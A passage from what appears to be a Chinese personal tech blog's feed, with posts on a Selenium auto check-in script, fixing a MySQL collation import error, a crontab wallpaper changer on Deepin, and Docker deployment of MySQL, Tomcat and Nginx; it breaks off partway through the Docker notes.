title="其他要点"></a>其他要点</h2><p>点击操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driver.find_element_by_xpath(<span class="string">'/html/body/div[2]/button'</span>).click()</span><br></pre></td></tr></table></figure><p>填写信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driver.find_element_by_id(<span class="string">'email'</span>).send_keys(username)</span><br></pre></td></tr></table></figure><p>获取元素内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driver.find_element_by_xpath(<span class="string">'//*[@id="swal2-content"]'</span>).text</span><br></pre></td></tr></table></figure><h1 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h1><p>对于selenium我个人感觉最大的缺点就是比较慢，相对于爬虫速度慢点多，代码中虽然用到了禁用图片、设置超时等操作但还是比较慢。不过对于自动签到而言，慢一点也没什么太大的影响，只要能稳定就行。</p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">功能：自动签到脚本</span></span><br><span class="line"><span class="string">配置：登录地址 + 账号 + 密码</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> NoSuchElementException</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkin</span><span class="params">(login_url,username,password)</span>:</span></span><br><span class="line">    chrome_options = Options()  <span class="comment">#解决使用chrome报错</span></span><br><span class="line">    chrome_options.add_argument(<span class="string">'--headless'</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">'--no-sandbox'</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">'--disable-dev-shm-usage'</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">"enable-automation"</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">"--headless"</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">"--window-size=1920,1080"</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">"--no-sandbox"</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">"--disable-extensions"</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">"--dns-prefetch-disable"</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">"--disable-gpu"</span>)</span><br><span class="line"></span><br><span class="line">    chrome_prefs = &#123;&#125;   <span class="comment">#禁止加载图片以提高速度</span></span><br><span class="line">    chrome_options.experimental_options[<span class="string">"prefs"</span>] = chrome_prefs</span><br><span class="line">    chrome_prefs[<span class="string">"profile.default_content_settings"</span>] = &#123;<span class="string">"images"</span>: <span class="number">2</span>&#125;</span><br><span class="line">    chrome_prefs[<span class="string">"profile.managed_default_content_settings"</span>] = &#123;<span class="string">"images"</span>: <span class="number">2</span>&#125;</span><br><span class="line">    driver = webdriver.Chrome(options=chrome_options, executable_path=<span class="string">'/usr/bin/chromedriver'</span>)  <span class="comment"># 初始化chrome</span></span><br><span class="line">    driver.set_page_load_timeout(<span class="number">30</span>) <span class="comment">#设置超时以提高速度</span></span><br><span class="line">    driver.maximize_window()  <span class="comment"># 最大化窗口</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        driver.get(login_url)  <span class="comment"># 进入登录页面</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        driver.execute_script(<span class="string">"window.stop()"</span>) <span class="comment">#加载超时停止加载执行下一步操作</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"当前页面为："</span>+driver.find_element_by_xpath(<span class="string">'//*[@id="app"]/section/div/div[1]/div/h4/span'</span>).text)</span><br><span class="line">    print(<span class="string">"当前账号为："</span>+username)</span><br><span class="line">    print(<span class="string">"--------------------------------"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        time.sleep(<span class="number">3</span>)  <span class="comment"># 延时加载</span></span><br><span class="line">        driver.find_element_by_id(<span class="string">'email'</span>).send_keys(username)  <span class="comment"># 填充用户名和密码</span></span><br><span class="line">        driver.find_element_by_id(<span class="string">'password'</span>).send_keys(password)</span><br><span class="line">        driver.find_element_by_xpath(<span class="string">'/html/body/div[1]/section/div/div[1]/div/form/div[4]/button'</span>).click()  <span class="comment"># 登录</span></span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line">        driver.find_element_by_xpath(<span class="string">'/html/body/div[2]/div/div/div[3]/button'</span>).click()   <span class="comment">#点击刚进主页弹出的弹窗</span></span><br><span class="line">        time.sleep(<span class="number">3</span>) <span class="comment">#等待两秒，点击read后网页流量是动态增加的</span></span><br><span class="line">        <span class="keyword">try</span>:  <span class="comment"># 未签到</span></span><br><span class="line">            driver.find_element_by_xpath(<span class="string">"/html/body/div[1]/div/div[3]/section/div[1]/div/div/a"</span>).click()  <span class="comment"># 点击签到</span></span><br><span class="line">            print(driver.find_element_by_xpath(<span class="string">'//*[@id="swal2-content"]'</span>).text)</span><br><span class="line">            driver.find_element_by_xpath(<span class="string">"/html/body/div[7]/div/div[3]/button[1]"</span>).click()</span><br><span class="line">            print(<span class="string">"签到成功，恭喜你，幸运的boy"</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(<span class="string">"已经签到过了"</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">        print(<span class="string">"签到失败"</span>)</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    print(<span class="string">"当前流量为："</span>+driver.find_element_by_xpath(<span class="string">"//*[@id='app']/div/div[3]/section/div[3]/div[2]/div/div[2]/div[2]/span"</span>).text+<span class="string">"G"</span>)</span><br><span class="line">    print()</span><br><span class="line">    driver.quit()</span><br><span class="line"></span><br><span class="line">checkin(<span class="string">"url"</span>,<span class="string">"账号"</span>,<span class="string">"密码"</span>)</span><br><span class="line">checkin(<span class="string">"url"</span>,<span class="string">"账号"</span>,<span class="string">"密码"</span>)</span><br></pre></td></tr></table></figure><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>以上仅为个人总结，我也是刚接触，如有错误，请联系我更正。以后发现更多linux和python有趣的事也会分享的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h1&gt;&lt;p&gt;前几天接触到linux中的crontab可以定时完成更换壁纸、推送本地文件到github等功能。这几天想着可不可以弄个自动签到的脚本，本来用
      
    
    </summary>
    
    
      <category term="日常办公" scheme="http://zssblog.top/categories/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
    
      <category term="日常办公" scheme="http://zssblog.top/tags/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
  </entry>
  
  <entry>
    <title>ERROR 1273 (HY000): Unknown collation: &#39;utf8mb4_0900_ai_ci&#39;</title>
    <link href="http://zssblog.top/2020/04/15/ERROR-1273-HY000-Unknown-collation-utf8mb4-0900-ai-ci/"/>
    <id>http://zssblog.top/2020/04/15/ERROR-1273-HY000-Unknown-collation-utf8mb4-0900-ai-ci/</id>
    <published>2020-04-15T13:21:41.000Z</published>
    <updated>2020-05-31T10:13:31.062Z</updated>
    
    <content type="html"><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>本地数据库迁移到服务器出错，特此记录下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR 1273 (HY000): Unknown collation: <span class="string">'utf8mb4_0900_ai_ci'</span></span><br></pre></td></tr></table></figure><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>本地：mysql  8.0.19<br>服务器：mysql 5.7.29</p><h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><p>因为是<strong>高版本导入到低版本</strong>，引起1273错误</p><p>打开sql文件，将文件中的所有<br>utf8mb4_0900_ai_ci替换为utf8_general_ci</p><p>utf8mb4替换为utf8<br>保存后重新在服务器运行sql文件即可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h1&gt;&lt;p&gt;本地数据库迁移到服务器出错，特此记录下。&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td
      
    
    </summary>
    
    
      <category term="日常办公" scheme="http://zssblog.top/categories/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
    
      <category term="日常办公" scheme="http://zssblog.top/tags/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
  </entry>
  
  <entry>
    <title>deepin使用crontab自动更换壁纸</title>
    <link href="http://zssblog.top/2020/04/13/deepin%E4%BD%BF%E7%94%A8crontab%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%8D%A2%E5%A3%81%E7%BA%B8/"/>
    <id>http://zssblog.top/2020/04/13/deepin%E4%BD%BF%E7%94%A8crontab%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%8D%A2%E5%A3%81%E7%BA%B8/</id>
    <published>2020-04-13T09:33:00.000Z</published>
    <updated>2020-04-14T03:20:08.324Z</updated>
    
    <content type="html"><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>deepin下有自动更换壁纸功能，但是最多间隔1小时且最多自动更换范围为15张图片。</p><h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><p>用python脚本更换壁纸，再利用crontab定时执行python脚本完成自动更换壁纸功能。crontab也可定时执行其他sh脚本、python脚本。我也是第一次接触crontab，后将其用于github博客每天自动更新，或者每天自动把本地笔记推到github都是不错的选择。</p><h1 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">利用linux下的crontab工具实现半小时切换一次，</span></span><br><span class="line"><span class="string">*/30 * * * * python /xxx/changebackground.py</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 更换壁纸指令，此为deepin更换指令，不代表所有linux发行版更换指令</span></span><br><span class="line">cmd = <span class="string">"gsettings set com.deepin.wrap.gnome.desktop.background picture-uri "</span></span><br><span class="line"><span class="comment"># 图片目录，用户可自主更换</span></span><br><span class="line">path = <span class="string">"/home/zss/Pictures/"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用os.listdir()方法获取图片目录下的所有文件名的列表</span></span><br><span class="line">pic_list = os.listdir(path)</span><br><span class="line"><span class="comment"># 确切的文件位置，以及确切的更换指令</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">real_path = path + str(random.choice(pic_list))</span><br><span class="line"><span class="keyword">if</span>(real_path[<span class="number">-3</span>:]==<span class="string">"jpg"</span> <span class="keyword">or</span> real_path[<span class="number">-3</span>:]==<span class="string">"png"</span>):</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">real_cmd = cmd + <span class="string">"\""</span> + real_path +<span class="string">"\""</span></span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line">pid = subprocess.check_output([<span class="string">"pgrep"</span>, <span class="string">"dde-session"</span>]).decode(<span class="string">"utf-8"</span>).strip()<span class="comment">#获取到dde-session的PID具体请看上面的那个问题与回答</span></span><br><span class="line">cmd = <span class="string">"grep -z DBUS_SESSION_BUS_ADDRESS /proc/"</span> + pid + <span class="string">"/environ|cut -d= -f2-"</span></span><br><span class="line">os.environ[<span class="string">"DBUS_SESSION_BUS_ADDRESS"</span>] = subprocess.check_output(</span><br><span class="line">    [<span class="string">'/bin/bash'</span>, <span class="string">'-c'</span>, cmd]).decode(<span class="string">"utf-8"</span>).strip().replace(<span class="string">"\0"</span>, <span class="string">""</span>)</span><br><span class="line">    </span><br><span class="line">os.system(real_cmd)</span><br></pre></td></tr></table></figure><blockquote><p>脚本为一篇博客发现，但原脚本本地执行有效，一放到corntab就不行，原因下面讲述。</p></blockquote><h1 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crontab <span class="literal">-e</span> //进入corntab文件</span><br><span class="line">crontab <span class="literal">-l</span> //查看corntan文件</span><br></pre></td></tr></table></figure><p>f1 f2 f3 f4 f5 program</p><ul><li>其中 f1 是表示分钟，f2 表示小时，f3 表示一个月份中的第几日，f4 表示月份，f5 表示一个星期中的第几天。program 表示要执行的程序。</li><li>当 f1 为 * 时表示每分钟都要执行 program，f2 为 * 时表示每小时都要执行程序，其馀类推</li><li>当 f1 为 a-b 时表示从第 a 分钟到第 b 分钟这段时间内要执行，f2 为 a-b 时表示从第 a 到第 b 小时都要执行，其馀类推</li><li>当 f1 为 */n 时表示每 n 分钟个时间间隔执行一次，f2 为 */n 表示每 n 小时个时间间隔执行一次，其馀类推</li><li>当 f1 为 a, b, c,… 时表示第 a, b, c,… 分钟要执行，f2 为 a, b, c,… 时表示第 a, b, c…个小时要执行，其馀类推</li></ul><h1 id="无效解决方法"><a href="#无效解决方法" class="headerlink" title="无效解决方法"></a>无效解决方法</h1><ol><li>所有文件必须是绝对路径</li><li>例如python命令也要用绝对路径，如/usr/bin/python</li><li>对于sh文件无效可尝试先进入文件夹再执行./test.sh</li><li>对于deepin更换壁纸一定要注意加上以下代码，具体原因见<a href="https://blog.csdn.net/u011648373/article/details/84837650" target="_blank" rel="noopener">用Python爬虫+Crontab实现自动更换电脑壁纸</a></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pid = subprocess.check_output([<span class="string">"pgrep"</span>, <span class="string">"dde-session"</span>]).decode(<span class="string">"utf-8"</span>).strip()<span class="comment">#获取到dde-session的PID具体请看上面的那个问题与回答</span></span><br><span class="line">cmd = <span class="string">"grep -z DBUS_SESSION_BUS_ADDRESS /proc/"</span> + pid + <span class="string">"/environ|cut -d= -f2-"</span></span><br><span class="line">os.environ[<span class="string">"DBUS_SESSION_BUS_ADDRESS"</span>] = subprocess.check_output(</span><br><span class="line">    [<span class="string">'/bin/bash'</span>, <span class="string">'-c'</span>, cmd]).decode(<span class="string">"utf-8"</span>).strip().replace(<span class="string">"\0"</span>, <span class="string">""</span>)</span><br></pre></td></tr></table></figure><h1 id="个人文件配置示例"><a href="#个人文件配置示例" class="headerlink" title="个人文件配置示例"></a>个人文件配置示例</h1><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200414111959680.png"  alt="在这里插入图片描述"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h1&gt;&lt;p&gt;deepin下有自动更换壁纸功能，但是最多间隔1小时且最多自动更换范围为15张图片。&lt;/p&gt;
&lt;h1 id=&quot;解决方法&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
      <category term="Linux" scheme="http://zssblog.top/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://zssblog.top/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Docker知识点总结</title>
    <link href="http://zssblog.top/2020/04/10/Docker%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/"/>
    <id>http://zssblog.top/2020/04/10/Docker%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/</id>
    <published>2020-04-10T08:41:00.000Z</published>
    <updated>2020-04-10T08:45:17.054Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>文章为黑马教程培训资料，B站视频教程：<a href="https://www.bilibili.com/video/BV167411g7Lg" target="_blank" rel="noopener">点我查看</a></p></blockquote><h1 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h1><h2 id="一、课程方式安装Docker"><a href="#一、课程方式安装Docker" class="headerlink" title="一、课程方式安装Docker"></a>一、课程方式安装Docker</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1、yum 包更新到最新 </span></span><br><span class="line">yum update</span><br><span class="line"><span class="meta">#</span><span class="bash"> 2、安装需要的软件包， yum-util 提供yum-config-manager功能，另外两个是devicemapper驱动依赖的 </span></span><br><span class="line">yum install -y yum-utils device-mapper-persistent-data lvm2</span><br><span class="line"><span class="meta">#</span><span class="bash"> 3、 设置yum源</span></span><br><span class="line">yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br><span class="line"><span class="meta">#</span><span class="bash"> 4、 安装docker，出现输入的界面都按 y </span></span><br><span class="line">yum install -y docker-ce</span><br><span class="line"><span class="meta">#</span><span class="bash"> 5、 查看docker版本，验证是否验证成功</span></span><br><span class="line">docker -v</span><br></pre></td></tr></table></figure><h2 id="二、其他安装方式-推荐"><a href="#二、其他安装方式-推荐" class="headerlink" title="二、其他安装方式(推荐)"></a>二、其他安装方式(推荐)</h2><p>教程链接：<a href="https://www.jianshu.com/p/1e5c86accacb" target="_blank" rel="noopener">https://www.jianshu.com/p/1e5c86accacb</a></p><h1 id="Docker应用部署"><a href="#Docker应用部署" class="headerlink" title="Docker应用部署"></a>Docker应用部署</h1><h2 id="一、部署MySQL"><a href="#一、部署MySQL" class="headerlink" title="一、部署MySQL"></a>一、部署MySQL</h2><ol><li>搜索mysql镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search mysql</span><br></pre></td></tr></table></figure><ol start="2"><li>拉取mysql镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull mysql:5.6</span><br></pre></td></tr></table></figure><ol start="3"><li>创建容器，设置端口映射、目录映射</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 在/root目录下创建mysql目录用于存储mysql数据信息</span></span><br><span class="line">mkdir ~/mysql</span><br><span class="line">cd ~/mysql</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker run -id \</span><br><span class="line">-p 3307:3306 \</span><br><span class="line">--name=c_mysql \</span><br><span class="line">-v $PWD/conf:/etc/mysql/conf.d \</span><br><span class="line">-v $PWD/logs:/logs \</span><br><span class="line">-v $PWD/data:/var/lib/mysql \</span><br><span class="line">-e MYSQL_ROOT_PASSWORD=123456 \</span><br><span class="line">mysql:5.6</span><br></pre></td></tr></table></figure><ul><li>参数说明：<ul><li><strong>-p 3307:3306</strong>：将容器的 3306 端口映射到宿主机的 3307 端口。</li><li><strong>-v $PWD/conf:/etc/mysql/conf.d</strong>：将主机当前目录下的 conf/my.cnf 挂载到容器的 /etc/mysql/my.cnf。配置目录</li><li><strong>-v $PWD/logs:/logs</strong>：将主机当前目录下的 logs 目录挂载到容器的 /logs。日志目录</li><li><strong>-v $PWD/data:/var/lib/mysql</strong> ：将主机当前目录下的data目录挂载到容器的 /var/lib/mysql 。数据目录</li><li><strong>-e MYSQL_ROOT_PASSWORD=123456：</strong>初始化 root 用户的密码。</li></ul></li></ul><ol start="4"><li>进入容器，操作mysql</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec –it c_mysql /bin/bash</span><br></pre></td></tr></table></figure><ol start="5"><li>使用外部机器连接容器中的mysql<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200410163539737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></li></ol><h2 id="二、部署Tomcat"><a href="#二、部署Tomcat" class="headerlink" title="二、部署Tomcat"></a>二、部署Tomcat</h2><ol><li>搜索tomcat镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search tomcat</span><br></pre></td></tr></table></figure><ol start="2"><li>拉取tomcat镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull tomcat</span><br></pre></td></tr></table></figure><ol start="3"><li>创建容器，设置端口映射、目录映射</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 在/root目录下创建tomcat目录用于存储tomcat数据信息</span></span><br><span class="line">mkdir ~/tomcat</span><br><span class="line">cd ~/tomcat</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run -id --name=c_tomcat \</span><br><span class="line">-p 8080:8080 \</span><br><span class="line">-v $PWD:/usr/local/tomcat/webapps \</span><br><span class="line">tomcat</span><br></pre></td></tr></table></figure><ul><li><p>参数说明：</p><ul><li><p><strong>-p 8080:8080：</strong>将容器的8080端口映射到主机的8080端口</p><p><strong>-v $PWD:/usr/local/tomcat/webapps：</strong>将主机中当前目录挂载到容器的webapps</p></li></ul></li></ul><ol start="4"><li>使用外部机器访问tomcat</li></ol><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200410163601273.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><h2 id="三、部署Nginx"><a href="#三、部署Nginx" class="headerlink" title="三、部署Nginx"></a>三、部署Nginx</h2><ol><li>搜索nginx镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search nginx</span><br></pre></td></tr></table></figure><ol start="2"><li>拉取nginx镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull nginx</span><br></pre></td></tr></table></figure><ol start="3"><li>创建容器，设置端口映射、目录映射</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 在/root目录下创建nginx目录用于存储nginx数据信息</span></span><br><span class="line">mkdir ~/nginx</span><br><span class="line">cd ~/nginx</span><br><span class="line">mkdir conf</span><br><span class="line">cd conf</span><br><span class="line"><span class="meta">#</span><span class="bash"> 在~/nginx/conf/下创建nginx.conf文件,粘贴下面内容</span></span><br><span class="line">vim nginx.conf</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">user  nginx;</span><br><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">error_log  /var/log/nginx/error.log warn;</span><br><span class="line">pid        /var/run/nginx.pid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       /etc/nginx/mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '</span><br><span class="line">                      '$status $body_bytes_sent "$http_referer" '</span><br><span class="line">                      '"$http_user_agent" "$http_x_forwarded_for"';</span><br><span class="line"></span><br><span class="line">    access_log  /var/log/nginx/access.log  main;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    #gzip  on;</span><br><span class="line"></span><br><span class="line">    include /etc/nginx/conf.d/*.conf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker run -id --name=c_nginx \</span><br><span class="line">-p 80:80 \</span><br><span class="line">-v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf \</span><br><span class="line">-v $PWD/logs:/var/log/nginx \</span><br><span class="line">-v $PWD/html:/usr/share/nginx/html \</span><br><span class="line">nginx</span><br></pre></td></tr></table></figure><ul><li>参数说明：<ul><li><strong>-p 80:80</strong>：将容器的 80端口映射到宿主机的 80 端口。</li><li><strong>-v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf</strong>：将主机当前目录下的 /conf/nginx.conf 